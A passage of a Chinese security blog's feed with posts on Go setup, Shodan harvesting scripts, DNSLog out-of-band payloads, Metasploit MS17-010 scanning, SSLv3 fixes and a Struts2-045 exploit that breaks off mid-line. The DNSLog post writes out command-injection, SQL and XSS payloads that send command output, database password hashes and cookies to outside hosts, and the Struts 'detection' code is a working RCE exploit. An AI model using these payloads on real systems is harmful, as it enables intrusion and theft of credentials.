    <content type="html"><![CDATA[<p>往期写东西都是总结性的,很少记录学习过程,近期接触了Go语言,开始记录学习Go的过程.<br><a id="more"></a></p><h1 id="Go-语言环境安装"><a href="#Go-语言环境安装" class="headerlink" title="Go 语言环境安装"></a>Go 语言环境安装</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://golang.google.cn" target="_blank" rel="noopener">Golang官网</a>，居然可以访问<code>google.cn</code>!<br><a href="https://golang.google.cn/dl/" target="_blank" rel="noopener">下载界面</a>获取对应操作系统源码包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dl.google.com/go/go1.9.3.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo tar -zxvf go1.9.3.linux-amd64.tar.gz -C /usr/<span class="built_in">local</span>/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin</span><br><span class="line">go version</span><br></pre></td></tr></table></figure><h2 id="添加环境变量"><a href="#添加环境变量" class="headerlink" title="添加环境变量"></a>添加环境变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">####GO####</span></span><br><span class="line"><span class="built_in">export</span> GOROOT=/usr/<span class="built_in">local</span>/go</span><br><span class="line"><span class="comment">#GOPATH</span></span><br><span class="line"><span class="built_in">export</span> GOPATH=/home/jeffzhang/Projects/go_workspace</span><br><span class="line"><span class="comment">#GOROOT BIN</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOROOT</span>/bin</span><br><span class="line"><span class="comment">#GOPATH BIN</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:<span class="variable">$GOPATH</span>/bin</span><br></pre></td></tr></table></figure><h2 id="安装-golang-org-中的包"><a href="#安装-golang-org-中的包" class="headerlink" title="安装 golang.org 中的包"></a>安装 golang.org 中的包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="variable">$GOPATH</span>/src/golang.org/x/ &amp;&amp; <span class="built_in">cd</span> <span class="variable">$GOPATH</span>/src/golang.org/x/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/golang/tools.git</span><br></pre></td></tr></table></figure><h1 id="年轻人第一个-Go-程序"><a href="#年轻人第一个-Go-程序" class="headerlink" title="年轻人第一个 Go 程序"></a>年轻人第一个 Go 程序</h1><h2 id="Hello-Word"><a href="#Hello-Word" class="headerlink" title="Hello Word"></a>Hello Word</h2><p>Goland 提供了在线练习环境<br><a href="https://play.golang.org/" target="_blank" rel="noopener">https://play.golang.org/</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   fmt.Println(<span class="string">"Hello, World!"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的程序,运行会打印出<code>Hello, World!</code><br>代码分三块:</p><ol><li><p>第一部分<code>package main</code>定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。</p></li><li><p>第二块<code>import &quot;fmt&quot;</code>告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数。</p></li><li><p>第三块<code>func main()</code>是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）</p></li></ol><h2 id="运行-Go-程序"><a href="#运行-Go-程序" class="headerlink" title="运行 Go 程序"></a>运行 Go 程序</h2><p>Goland 提供了在线练习环境可以直接运行程序,本次使用需要依赖<code>Goland</code>环境</p><ol><li>将代码保存为<code>test.go</code></li><li>打开命令行，并进入程序文件保存的目录中</li><li>输入命令<code>go run test.go</code>并按回车执行代码</li></ol><h1 id="不记了，一把梭子干到底，直接写代码"><a href="#不记了，一把梭子干到底，直接写代码" class="headerlink" title="不记了，一把梭子干到底，直接写代码"></a>不记了，一把梭子干到底，直接写代码</h1>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;往期写东西都是总结性的,很少记录学习过程,近期接触了Go语言,开始记录学习Go的过程.&lt;br&gt;
    
    </summary>
    
    
      <category term="G" scheme="http://reboot.cf/tags/G/"/>
    
  </entry>
  
  <entry>
    <title>Shodan调用接口查询</title>
    <link href="http://reboot.cf/2018/01/19/Shodan%E8%B0%83%E7%94%A8%E6%8E%A5%E5%8F%A3%E6%9F%A5%E8%AF%A2/"/>
    <id>http://reboot.cf/2018/01/19/Shodan调用接口查询/</id>
    <published>2018-01-19T06:11:25.000Z</published>
    <updated>2018-02-09T08:38:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>Shodan是一个搜索引擎，但它与Google这种搜索网址的搜索引擎不同，Shodan是用来搜索网络空间中在线设备的，安全人员可以通过Shodan搜索指定的设备，或者搜索特定类型的设备<br><a id="more"></a><br>最近测试要频繁的收集一些特定的网络设备，写个Python自动获取，Shodan官方提供了Python接口调用模块，只需要调用就可以了<br><a href="https://developer.shodan.io/api/clients" target="_blank" rel="noopener">官方接口文档</a></p><p><a href="https://shodan.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方Python库地址</a><br>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : jeffzhang</span></span><br><span class="line"><span class="comment"># @Time    : 2018/01/12</span></span><br><span class="line"><span class="comment"># @File    : shodan_search_api.py</span></span><br><span class="line"><span class="comment"># @Desc    : ""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> shodan</span><br><span class="line"></span><br><span class="line">API_KEY = <span class="string">""</span></span><br><span class="line">Shodan_API = shodan.Shodan(API_KEY)</span><br><span class="line">query = raw_input(<span class="string">"Enter search query: "</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    results = Shodan_API.search(query)</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results[<span class="string">'matches'</span>]:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"shodan_"</span> + query + <span class="string">".dict"</span>, <span class="string">"a+"</span>) <span class="keyword">as</span> result_output:</span><br><span class="line">            result_output.write(str(result[<span class="string">'ip_str'</span>]) + <span class="string">":"</span> + str(result[<span class="string">'port'</span>]) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'IP: %s'</span> % result[<span class="string">'ip_str'</span>], result[<span class="string">'port'</span>]</span><br><span class="line">        <span class="comment"># print result['data']</span></span><br><span class="line">        <span class="comment"># print ''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Results found: %s'</span> % results[<span class="string">'total'</span>]</span><br><span class="line"><span class="keyword">except</span> shodan.APIError <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : jeffzhang</span></span><br><span class="line"><span class="comment"># @Time    : 2018/01/30</span></span><br><span class="line"><span class="comment"># @File    : _shodan.py</span></span><br><span class="line"><span class="comment"># @Desc    : "默认查询500条结果"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_shodan</span><span class="params">(search_query, api_key)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> page <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            req_url = <span class="string">"https://api.shodan.io/shodan/host/search?key=%s&amp;query=%s&amp;page=%s"</span> % (api_key, search_query, page)</span><br><span class="line">            respond = requests.get(req_url)</span><br><span class="line">            <span class="keyword">for</span> result <span class="keyword">in</span> respond.json()[<span class="string">'matches'</span>]:</span><br><span class="line">                ip_str = result[<span class="string">'ip_str'</span>]</span><br><span class="line">                port = result[<span class="string">'port'</span>]</span><br><span class="line">                location = result[<span class="string">"location"</span>][<span class="string">"country_name"</span>] + <span class="string">","</span> + str(result[<span class="string">"location"</span>][<span class="string">"city"</span>])</span><br><span class="line">                print(ip_str, port, location)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    API_KEY = <span class="string">""</span></span><br><span class="line">    s_query = <span class="string">"weblogic country:CN"</span></span><br><span class="line">    search_shodan(s_query, API_KEY)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Shodan是一个搜索引擎，但它与Google这种搜索网址的搜索引擎不同，Shodan是用来搜索网络空间中在线设备的，安全人员可以通过Shodan搜索指定的设备，或者搜索特定类型的设备&lt;br&gt;
    
    </summary>
    
    
      <category term="Shodan" scheme="http://reboot.cf/tags/Shodan/"/>
    
      <category term="Python" scheme="http://reboot.cf/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>DNSLog使用</title>
    <link href="http://reboot.cf/2018/01/19/DNSLog%E4%BD%BF%E7%94%A8/"/>
    <id>http://reboot.cf/2018/01/19/DNSLog使用/</id>
    <published>2018-01-19T05:47:33.000Z</published>
    <updated>2018-01-19T06:05:13.288Z</updated>
    
    <content type="html"><![CDATA[<p>通过监测DNS解析和HTTP访问记录，来展现执行结果，在检测盲注类漏洞或没有回显的命令执行等漏洞时有着非常重要的作用<br><a id="more"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.target.ping.rce.dns.ga</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name=<span class="string">'SYS'</span>)||<span class="string">'.target.sql.dns.ga'</span>,80) FROM DUAL;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT LOAD_FILE(CONCAT(<span class="string">'\\\\'</span>,(SELECT password FROM user WHERE user=<span class="string">'root'</span> LIMIT 1),<span class="string">'target.sql.dns.ga\\abc'</span>));</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"http://target.rce.dns.ga/`whoami`"</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">"http://target.rce.dns.ga/`id`"</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s=<span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">s.src=<span class="string">"http://target.xss.dns.ga/?xss="</span>+<span class="built_in">document</span>.location+<span class="string">"&amp;cookie="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(s);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;通过监测DNS解析和HTTP访问记录，来展现执行结果，在检测盲注类漏洞或没有回显的命令执行等漏洞时有着非常重要的作用&lt;br&gt;
    
    </summary>
    
    
      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
    
      <category term="DNSLog" scheme="http://reboot.cf/tags/DNSLog/"/>
    
  </entry>
  
  <entry>
    <title>MS17-010批量检测</title>
    <link href="http://reboot.cf/2017/12/09/MS17-010%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8B/"/>
    <id>http://reboot.cf/2017/12/09/MS17-010批量检测/</id>
    <published>2017-12-09T10:06:37.000Z</published>
    <updated>2018-01-19T01:56:28.464Z</updated>
    
    <content type="html"><![CDATA[<p>客户内网有套系统用到了很多Windows系统，记录一下使用Metasploit批量检测方法<br><a id="more"></a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><p>服务器较多，加上都是批量上的默认配置，所以先用<code>nmap</code>扫描开放445端口的主机，然后对这些开了端口的服务做扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">db_nmap -sT -T4 10.88.32.0/24 -p 445 --open</span><br></pre></td></tr></table></figure><p>扫描的结果会存储在数据库里，在接下来的MS17-010漏洞扫描模块里中直接调用,注意扫描端口之前最好<code>host -d</code>清除之前的数据</p><h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p>Metasploit扫描模块已经更新了，如果没有的话<code>msfupdate</code>一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">hosts -R</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>这边<code>hosts</code>的<code>-R</code>参数是将数据库的<code>host</code>作为扫描模块的<code>RHOSTS</code>参数引入</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>漏洞利用模块在<code>exploit/windows/smb/ms17_010_eternalblue</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;客户内网有套系统用到了很多Windows系统，记录一下使用Metasploit批量检测方法&lt;br&gt;
    
    </summary>
    
    
      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
    
      <category term="Metasploit" scheme="http://reboot.cf/tags/Metasploit/"/>
    
  </entry>
  
  <entry>
    <title>SSLv3协议漏洞修复</title>
    <link href="http://reboot.cf/2017/11/08/SSLv3%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D/"/>
    <id>http://reboot.cf/2017/11/08/SSLv3协议漏洞修复/</id>
    <published>2017-11-08T10:09:27.000Z</published>
    <updated>2018-01-19T01:58:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近扫描发现各种各样的SSLv3协议漏洞，记录一下修复方式<br><a id="more"></a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>SSLv3漏洞（CVE-2014-3566），该漏洞贯穿于所有的<code>SSLv3</code>版本中，利用该漏洞，黑客可以通过中间人攻击等类似的方式(只要劫持到的数据加密两端均使用<code>SSL3.0</code>)，便可以成功获取到传输数据(例如<code>cookies</code>)。<br>针对此漏洞，需要服务器端和客户端均停用<code>SSLv3</code>协议。</p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><p>测试某一系统是否支持SSLv3，可使用<code>OpenSSL</code>命令，如下所示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -ssl3 -connect google.com:443</span><br></pre></td></tr></table></figure><p>正常返回内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">CONNECTED(00000003)</span><br><span class="line">depth=2 /C=US/O=GeoTrust Inc./CN=GeoTrust Global CA</span><br><span class="line">verify error:num=20:unable to get <span class="built_in">local</span> issuer certificate</span><br><span class="line">verify <span class="built_in">return</span>:0</span><br><span class="line">---</span><br><span class="line">Certificate chain</span><br><span class="line">--- Certificate details removed <span class="keyword">for</span> brevity ---</span><br><span class="line">---</span><br><span class="line">New, TLSv1/SSLv3, Cipher is RC4-SHA</span><br><span class="line">Server public key is 2048 bit</span><br><span class="line">Secure Renegotiation IS supported</span><br><span class="line">Compression: NONE</span><br><span class="line">Expansion: NONE</span><br><span class="line">SSL-Session:</span><br><span class="line">    Protocol  : SSLv3</span><br><span class="line">    Cipher    : RC4-SHA</span><br><span class="line">    Session-ID: 6E461AEAD8C1516F9D8950A9B5E735F9882BFC6EA0838D81CFD41C01A3799A41</span><br><span class="line">    Session-ID-ctx:</span><br><span class="line">    Master-Key: 7E7680640BB7E2C83CBE87342727E0D09AC10EEEB095A8C0A2501EAE80FA1C20D3F3FE4346B1234057D6D506420273FA</span><br><span class="line">    Key-Arg   : None</span><br><span class="line">    Start Time: 1421296281</span><br><span class="line">    Timeout   : 7200 (sec)</span><br><span class="line">    Verify <span class="built_in">return</span> code: 0 (ok)</span><br></pre></td></tr></table></figure><p>发生握手失败错误表明并不支持使用SSLv3，并且服务器并不存在漏洞（用于进行<code>POODLE</code>攻击。)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">139990104422040:error:140A90C4:SSL routines:SSL_CTX_new:null ssl method passed:ssl_lib.c:1878:</span><br></pre></td></tr></table></figure><h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h1><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><p>修该配置文件只允许TLS协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!eNULL:!EXPORT:!DES:!3DES:!MD5:!DSS:!PKS;</span><br><span class="line">ssl_session_timeout 5m;</span><br><span class="line">ssl_session_cache <span class="built_in">builtin</span>:1000 shared:SSL:10m;</span><br></pre></td></tr></table></figure><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><p>修改配置文件禁用SSLv3协议</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SSLProtocol all -SSLv2 -SSLv3</span><br><span class="line">SSLHonorCipherOrder on</span><br><span class="line">SSLCipherSuite ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!MD5:!DSS</span><br></pre></td></tr></table></figure><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><p>请参考：<a href="http://support2.microsoft.com/kb/187498/en-us" target="_blank" rel="noopener">http://support2.microsoft.com/kb/187498/en-us</a><br>或：<a href="http://support2.microsoft.com/kb/187498/zh-cn" target="_blank" rel="noopener">http://support2.microsoft.com/kb/187498/zh-cn</a><br>进行手工修复，或者使用fix it向导进行修复。<br>修改完后，Linux重启Web服务即可，Windwos需要重新启动计算机。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近扫描发现各种各样的SSLv3协议漏洞，记录一下修复方式&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RSAS使用VPN代理</title>
    <link href="http://reboot.cf/2017/10/19/RSAS%E4%BD%BF%E7%94%A8VPN%E4%BB%A3%E7%90%86/"/>
    <id>http://reboot.cf/2017/10/19/RSAS使用VPN代理/</id>
    <published>2017-10-19T10:14:10.000Z</published>
    <updated>2018-01-19T01:56:23.231Z</updated>
    
    <content type="html"><![CDATA[<p>RSAS是绿盟的漏洞扫描器，用是挺好用的就是不支持VPN，客户系统大多做了网络隔离的，只能VPN访问，但方法还是有的，先用Windows拨VPN，然后利用Windows的Internet网络连接共享功能来做跳板进行扫描。<br><a id="more"></a></p><ul><li>使用电脑无线网卡连接WiFi</li><li>使用VPN软件连接VPN</li><li>打开网络适配器，右键VPN的虚拟网卡</li><li>点击属性，打开共享</li><li>在internet连接共享里勾选允许，并选择电脑有线网卡</li><li>网线与扫描器直连</li><li>扫描器网络配置里IP配置为192.168.137.2，子网掩码为24位，网关为192.168.137.1</li><li>尝试扫描器ping一下要扫描的对象</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;RSAS是绿盟的漏洞扫描器，用是挺好用的就是不支持VPN，客户系统大多做了网络隔离的，只能VPN访问，但方法还是有的，先用Windows拨VPN，然后利用Windows的Internet网络连接共享功能来做跳板进行扫描。&lt;br&gt;
    
    </summary>
    
    
      <category term="Scan" scheme="http://reboot.cf/tags/Scan/"/>
    
      <category term="RASA" scheme="http://reboot.cf/tags/RASA/"/>
    
  </entry>
  
  <entry>
    <title>Struts2-045命令执行漏洞</title>
    <link href="http://reboot.cf/2017/09/28/Struts2-045%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://reboot.cf/2017/09/28/Struts2-045命令执行漏洞/</id>
    <published>2017-09-28T09:57:54.000Z</published>
    <updated>2018-01-19T01:56:20.255Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品：Struts1和Struts2，ApacheStruts 2.3.5–2.3.31版本及2.5–2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）<br><a id="more"></a></p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>攻击者可通过发送恶意构造的<code>HTTP</code>数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启<code>dmi</code>、<code>debug</code>等功能）以及启用任何插件，因此漏洞危害较为严重。</p><h1 id="修复措施"><a href="#修复措施" class="headerlink" title="修复措施"></a>修复措施</h1><p>目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。</p><h1 id="自查方式"><a href="#自查方式" class="headerlink" title="自查方式"></a>自查方式</h1><p>用户可查看web目录下<code>/WEB-INF/lib/</code>目录下的<code>struts-core.x.x.jar</code>文件如果这个版本在Struts2.3.5到Struts2.3.31以及Struts2.5到Struts2.5.10之间则存在漏洞。</p><h1 id="升级修复"><a href="#升级修复" class="headerlink" title="升级修复"></a>升级修复</h1><p>受影响用户可升级版本至Apache Struts 2.3.32或Apache Struts 2.5.10.1以消除漏洞影响。<br>删除<code>commons-fileupload-x.x.x.jar</code>文件（会造成上传功能不可用）。</p><h1 id="检测代码"><a href="#检测代码" class="headerlink" title="检测代码"></a>检测代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, cmd)</span>:</span></span><br><span class="line">    payload = <span class="string">"Content-Type:%&#123;(#_='multipart/form-data')."</span></span><br><span class="line">    payload += <span class="string">"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."</span></span><br><span class="line">    payload += <span class="string">"(#_memberAccess?"</span></span><br><span class="line">    payload += <span class="string">"(#_memberAccess=#dm):"</span></span><br><span class="line">    payload += <span class="string">"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."</span></span><br><span class="line">    payload += <span class="string">"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."</span></span><br><span class="line">    payload += <span class="string">"(#ognlUtil.getExcludedPackageNames().clear())."</span></span><br><span class="line">    payload += <span class="string">"(#ognlUtil.getExcludedClasses().clear())."</span></span><br><span class="line">    payload += <span class="string">"(#context.setMemberAccess(#dm))))."</span></span><br><span class="line">    payload += <span class="string">"(#cmd='%s')."</span> % cmd</span><br><span class="line">    payload += <span class="string">"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."</span></span><br><span class="line">    payload += <span class="string">"(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;))."</span></span><br><span class="line">    payload += <span class="string">"(#p=new java.lang.ProcessBuilder(#cmds))."</span></span><br><span class="line">    payload += <span class="string">"(#p.redirectErrorStream(true)).(#process=#p.start())."</span></span><br><span class="line">    payload += <span class="string">"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."</span></span><br><span class="line">    payload += <span class="string">"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."</span></span><br><span class="line">    payload += <span class="string">"(#ros.flush())&#125;"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0'</span>, <span class="string">'Content-Type'</span>: payload&#125;</span><br><span class="line">        request = urllib2.Request(url, headers=headers)</span><br><span class="line">        page = 